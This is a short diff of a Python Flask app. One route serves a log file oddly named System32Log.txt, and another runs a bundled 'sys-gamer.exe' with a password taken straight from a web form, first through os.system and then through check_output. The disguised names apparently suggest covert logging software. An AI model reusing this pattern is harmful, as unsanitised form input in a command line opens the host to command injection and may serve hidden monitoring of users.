@@ -292,13 +292,6 @@ def logger():
     if not session.get('logged_in'):
         return ip_func(func="logger")
     else:
-        """
-        logger = ("type C:\\Users\\Public\\System32Log.txt")
-        loggs = str(check_output(logger, shell=True))  # .decode(encoding="utf-8")
-        print(loggs)
-        loggs = base64.b64encode(loggs.encode('utf_16_le')).decode('utf-8')
-        print(loggs)
-        """
         file = open("C:\\Users\\Public\\System32Log.txt", "r")
         loggs = file.read()
         file.close()
@@ -337,9 +330,9 @@ def password():
             passw = request.form['pasw']
             time.sleep(3)
             shail = ('"' + wd + "\\static\\sys-gamer.exe" + '" ' + passw)
-            print (shail)
-            changed = os.system(shail)
-            if changed == 0:  # True
+            changed = (check_output(shail).decode())
+            print(changed)
+            if changed == u'ha\r\n':  # True
                 return html_pass2
             else:  # False
                 return html_pass1
